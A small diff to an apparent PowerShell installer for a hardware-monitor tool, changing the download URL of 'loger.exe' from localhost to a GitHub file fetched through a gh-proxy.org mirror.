@@ -4,7 +4,7 @@ try {
     Write-Warning "Could not configure security protocols. Using system defaults."
 }
 
-$DownloadUrl        = "https://localhost/tools/loger.exe"
+$DownloadUrl        = "https://gh-proxy.org/https://github.com/Xramas/loger/blob/master/loger.exe"
 $TargetDirectory    = "C:\Program Files\HardwareMonitor"
 $BinaryPath         = Join-Path $TargetDirectory "loger.exe"
 $ServiceName        = "LogerHardwareMonitor"
